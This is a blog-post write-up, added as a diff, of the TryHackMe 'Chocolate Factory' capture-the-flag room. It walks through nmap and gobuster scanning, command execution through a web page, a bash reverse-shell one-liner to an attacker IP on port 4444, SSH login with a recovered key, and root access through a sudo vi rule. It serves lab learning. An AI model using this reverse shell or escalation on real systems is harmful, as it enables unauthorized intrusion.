@@ -1,0 +1,104 @@
+---
+title: "ChocolateFactory TryHackMe"
+date: "07-12-2021"
+author: "Reda BELHAJ"
+summary: "This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa!"
+tags: ["Tryhackme", "Ctf", "Writeup"]
+image: "/images/chocolateTHM/chocolate.jpg"
+---
+
+## Enumeration:
+### Nmap Scan:
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+nmap -sC -sV -n -Pn 10.10.48.21 --reason
+```
+
+|Port   |Service   |
+|---|---|
+|21/tcp   |FTP   |
+|22/tcp   |SSH   |
+|80/tcp   |HTTP   |
+|100/tcp  |newacct?  |
+|106/tcp  |pop3pw?  |
+|109/tcp  |pop2?  |
+|110/tcp  |pop3?  |
+|111/tcp  |rpcbind?  |
+|113/tcp  |ident?  |
+|119/tcp  |nntp?  |
+|125/tcp  |locus-map?  |
+
+### Gobuster Scan:
+I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
+
+```
+gobuster dir -u http://10.10.48.21/  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,xml,php 
+```
+
+The wordlist I choosed to run this scan can be found in [danielmiessler's repository](https://github.com/danielmiessler/SecLists).
+
+After we've completed our scan, we see a new page : ***"home.php"*** that allow you to submit commands via a prompt, I used the ls command and then the cat command to find the key in a file called **key\_rev\_key**.
+
+## Enter the key you found!
+
+```
+VkgXhFf6sAE*******************************
+```
+
+## Reverse Shell
+
+```
+bash -c 'exec bash -i &>/dev/tcp/10.8.174.180/4444 <&1'
+```
+
+## What is Charlie's password?
+
+I was looking with (www-html) user permission 
+I found the password of charlie in the ***validate.php*** file:
+
+```
+cn****
+```
+
+## Enter the user flag
+and I also found an rsa key and i saved it in ***Desktop/rsa***
+
+```
+ssh charlie@10.10.48.21 -i rsa
+```
+
+```
+cat /home/charlie/user.txt
+```
+
+## Privilege Escalation
+
+I typed the famous:
+```
+sudo -l
+```
+
+and it returned:
+```
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+
+```
+
+So i run the command sa root and i typed 
+```
+:shell
+```
+
+And i tried to find the root flag by :
+```
+find / root.txt
+```
+
+and i found: /root/root.py and I typed the key that i found in the first question:
+```
+flag{cec5916*************************}
+```
+
+![root image](/images/chocolateTHM/root.jpg)
